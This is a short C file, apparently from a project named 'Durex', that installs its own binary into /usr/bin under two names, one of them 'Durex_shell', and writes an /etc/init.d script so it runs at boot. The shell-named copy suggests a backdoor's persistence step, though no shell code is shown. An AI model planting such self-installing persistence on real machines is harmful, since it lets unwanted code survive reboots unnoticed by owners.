#include "durex.h"
#include "daemon_init.h"

static void	install_daemon_binary(void)
{
	char *binary = NULL;
	size_t size = file_get_contents_size(&binary, "./Durex");

	if (binary == NULL)
		return ;
	file_put_contents_size("/usr/bin/Durex", binary, size);
	file_put_contents_size("/usr/bin/Durex_shell", binary, size);
}

static void	install_daemon_kernel_runtime(void)
{
	file_put_contents("/etc/init.d/Durex", (char*)daemon_init);
}

void		daemon_install(void)
{
	install_daemon_binary();
	install_daemon_kernel_runtime();
}
